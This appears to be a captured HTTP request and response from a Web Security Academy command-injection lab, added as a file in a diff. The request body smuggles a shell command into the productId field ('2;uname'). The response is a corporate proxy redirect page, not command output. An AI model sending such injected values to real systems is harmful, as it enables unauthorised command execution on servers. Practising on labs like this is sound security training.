@@ -1,0 +1,124 @@
+Request: 
+POST /product/stock HTTP/1.1
+Host: 0ac200da0321510a808826e000090036.web-security-academy.net
+Cookie: session=pmw3NPvaYkn3NsBU3HzvpV1P61bh2OvC
+Content-Length: 27
+Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
+Sec-Ch-Ua-Platform: "Windows"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: https://0ac200da0321510a808826e000090036.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0ac200da0321510a808826e000090036.web-security-academy.net/product?productId=2
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=1, i
+Connection: close
+
+productId=2;uname&storeId=1
+
+
+
+Response:
+HTTP/1.1 307 Proxy Redirect
+Mime-Version: 1.0
+Date: Mon, 26 Feb 2024 21:06:40 PST
+Via: 1.1 hk1-proxy02.corp.expeditors.com:80 (Cisco-WSA/11.8.1-023)
+Content-Type: text/html
+Cache-Control: no-cache
+Location: https://proxy02.hk1.ei/B0002D0000N0002N0002F0000S0000R0004/10.249.5.65/https://0ac200da0321510a808826e000090036.web-security-academy.net/product/stock
+Connection: close
+Content-Length: 1909
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Notification: Redirect</title>
+<style type="text/css">
+body {
+  font-family: Arial, Helvetica, sans-serif;
+  font-size: 14px;
+  color:#333333;
+  background-color: #ffffff;
+}
+h1 {
+  font-size: 18px;
+  font-weight: bold;
+  text-decoration: none;
+  padding-top: 0px;
+  color: #2970A6;
+}
+a:link {
+    color: #2970A6;
+  text-decoration: none;
+}
+a:hover {
+    color: #2970A6;
+  text-decoration: underline;
+}
+p.buttonlink {
+  margin-bottom: 24px;
+}
+.copyright {
+  font-size: 12px;
+  color: #666666;
+  margin: 5px 5px 0px 30px;
+}
+.copyright_alone {
+  font-size: 12px;
+  color: #666666;
+  margin: 35px 5px 0px 30px;
+}
+.details {
+  font-size: 14px;
+  color: #969696;
+  border: none;
+  padding: 20px 20px 20px 20px;
+  margin: 0px 10px 10px 35px;
+}
+
+.shadow {
+  border: 3px solid #9f9f9f;
+  padding: 10px 25px 10px 25px;
+  margin: 10px 35px 0px 30px;
+  background-color: #ffffff;
+  width: 600px;
+
+  -moz-box-shadow: 3px 3px 3px #cccccc;
+  -webkit-box-shadow: 3px 3px 3px #cccccc;
+  box-shadow: 3px 3px 3px #cccccc;
+  /* For IE 8 */
+  -ms-filter: "progid:DXImageTransform.Microsoft.Shadow(Strength=5, Direction=135, Color='cccccc')";
+  /* For IE 5.5 - 7 */
+  filter: progid:DXImageTransform.Microsoft.Shadow(Strength=5, Direction=135, Color='cccccc');
+}
+.logo {
+  border: none;
+  margin: 5px 5px 0px 30px;
+}
+</style>
+
+</head>
+
+<body>
+<div class="logo"></div><p>&nbsp;</p>
+<div class="shadow">
+<h1>Page Redirection</h1>
+
+
+<p>
+This request is being redirected. If this page does not automatically
+redirect, <a href="https://proxy02.hk1.ei/B0002D0000N0002N0002F0000S0000R0004/10.249.5.65/https://0ac200da0321510a808826e000090036.web-security-academy.net/product/stock">click here to proceed</a>&nbsp;.
+</p>
+
+</div>
+
+
+</body>
+</html>
